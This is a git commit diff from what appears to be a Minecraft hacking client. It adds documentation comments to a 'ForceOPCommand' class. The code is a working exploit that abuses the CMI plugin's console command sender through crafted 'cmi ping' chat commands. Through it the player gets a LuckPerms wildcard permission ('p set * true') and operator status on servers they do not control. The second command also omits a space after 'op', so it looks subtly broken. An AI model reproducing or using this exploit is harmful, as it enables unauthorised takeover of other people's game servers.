4af6e4ea07b96afa8b99661d7c80bc28c38d53cd
Milkthedev <128710385+SpigotRCE@users.noreply.github.com>
2024-08-31 13:46:49 +0530

    added java doc

--- src/main/java/io/github/spigotrce/paradiseclientfabric/command/impl/ForceOPCommand.java
+++ src/main/java/io/github/spigotrce/paradiseclientfabric/command/impl/ForceOPCommand.java
@@ -7,17 +7,37 @@ import io.github.spigotrce.paradiseclientfabric.command.Command;
 
 import java.util.Objects;
 
+/**
+ * This class represents a command that forces the player to be OP in a Minecraft client using a CMI console command sender exploit.
+ *
+ * @author SpigotRCE
+ * @since 1.6
+ */
 public class ForceOPCommand extends Command {
+
+    /**
+     * Constructs a new instance of the ForceOPCommand class.
+     *
+     * @param minecraftClient The Minecraft client instance.
+     */
     public ForceOPCommand(MinecraftClient minecraftClient) {
         super("paradiseforceop", "Gives OP thru CMI console command sender exploit", minecraftClient);
     }
 
+    /**
+     * Builds the command using Brigadier's command builder.
+     *
+     * @return The built command.
+     */
     @Override
     public LiteralArgumentBuilder<FabricClientCommandSource> build() {
         return literal(getName())
                 .executes((context -> {
+                    // Sends a CMI console command to set the player's permissions to true using LuckPerms.
                     Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + getMinecraftClient().getSession().getUsername() + " p set * true</CC>");
+                    // Sends a CMI console command to grant the player OP status.
                     Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + getMinecraftClient().getSession().getUsername() + "</CC>");
+                    // Returns a success status.
                     return SINGLE_SUCCESS;
                 }));
     }
